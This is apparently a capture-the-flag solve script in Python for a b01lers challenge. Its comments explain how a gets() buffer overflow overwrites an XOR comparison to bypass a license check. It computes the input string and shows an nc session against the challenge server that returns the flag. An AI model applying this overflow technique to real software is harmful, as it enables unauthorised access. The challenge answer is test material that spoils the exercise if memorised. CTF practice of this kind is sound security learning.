# some values found through debugging
# these were being xored to get to the
# code that got us the flag

a = [0x43,0x4F,0x4F,0x4C,0x44,0x41,0x56,0x00]
b = [0x11,0x0F,0xDC,0x49,0xD6,0xD5,0x04,0x10]
c = [0x52,0x40,0x93,0x05,0x92,0x94,0x52,0x10]

# the first check needed input to be of the form:
# COOLDAV COOLDAV COOLDAV

# where the first and third COOLDAV get XORed to form the second COOLDAV.
# whereas the second check needed the input to not be of the form COOLDAV.

# the second check was implemented via strcmp.
# so we can bypass the first check by overwriting
# the xored memory location since the program uses
# gets() which allows for a buffer overflow.


# so we can either push bad chars, or figure out good characters:
# COOLDAV 0123456

a = "COOLDAV"
b = "0124456"
d = ""

for i,j in zip(a,b):
    d += chr(ord(i)^ord(j))

print d

# COOLDAV 0124456 s~}xpt`

"""
$ nc pwn.ctf.b01lers.com 1001
Dave has ruined our system. He updated the code, and now he even has trouble checking his own liscense!
If you can please make it work, we'll reward you!

Welcome to the Department of Flying Vehicles.
Which liscense plate would you like to examine?
 > COOLDAV 0124456 s~}xpt`
Thank you so much! Here's your reward!
pctf{sp4c3_l1n3s_R_sh0r7!}
"""

